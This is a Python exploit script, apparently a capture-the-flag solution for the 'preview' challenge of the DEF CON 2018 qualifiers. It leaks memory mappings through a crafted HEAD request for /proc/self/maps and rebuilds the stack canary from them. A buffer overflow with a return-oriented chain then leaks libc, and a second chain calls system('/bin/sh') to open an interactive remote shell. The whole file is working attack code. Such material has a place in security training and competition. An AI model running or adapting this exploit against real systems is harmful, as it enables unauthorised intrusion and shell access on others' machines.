#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import commands

bin_file = './preview'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'cee810fa.quals2018.oooverflow.io', 'port':31337})
env.set_item('libc',    debug   = '/lib/x86_64-linux-gnu/libc.so.6', \
                        local   = '/lib/x86_64-linux-gnu/libc.so.6', \
                        remote  = 'libc-2.23.so')
env.select()

#==========

offset_plt_puts     = 0x0009e0 
offset_got_main     = 0x202068 

offset_main         = 0x000fe8
offset_rdi          = 0x0010b3

libc = ELF(env.libc)
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    conn.sendlineafter('requests\n', 'HEAD /proc/self/maps')

    conn.recvuntil('preview:\n')
    for s in filter(lambda x : 'r-xp' in x, conn.recv().split('\n')):
        addr = int(s.split('-')[0], 16)
        if 'ld' in s:
            addr_ld_base  = addr
            info('addr_ld_base      = 0x{:08x}'.format(addr_ld_base))
        else:
            addr_bin_base       = addr
            addr_plt_puts       = addr_bin_base + offset_plt_puts
            addr_got_main       = addr_bin_base + offset_got_main
            addr_main           = addr_bin_base + offset_main
            addr_rdi            = addr_bin_base + offset_rdi
            info('addr_binf_base    = 0x{:08x}'.format(addr_bin_base))

    canary = (addr_ld_base << 24) + (addr_bin_base >> 4)
    info('canary            = 0x{:08x}'.format(canary))

    exploit  = 'a'*0x58
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_rdi)
    exploit += p64(addr_got_main)
    exploit += p64(addr_plt_puts)
    exploit += p64(addr_main)
    conn.sendline(exploit)

    conn.recvuntil('Malformed request\n')
    libc.address = u(conn.recvuntil('\n', drop=True)) - offset_libc_main
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    exploit  = 'a'*0x58
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_rdi)
    exploit += p64(addr_libc_str_sh)
    exploit += p64(addr_libc_system)
    conn.sendlineafter('requests\n', exploit)

def remote_pow(conn):
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n', drop=True)
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n', drop=True))
    info('challenge: {}, n: {}'.format(challenge, n))

    solution = commands.getoutput('./pow {} {}'.format(challenge, n))
    info('solution: {}'.format(solution))
    conn.sendlineafter('Solution: \n', str(solution))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    if env.check('remote'):
        remote_pow(conn)
    attack(conn)
    conn.interactive()
    
#==========
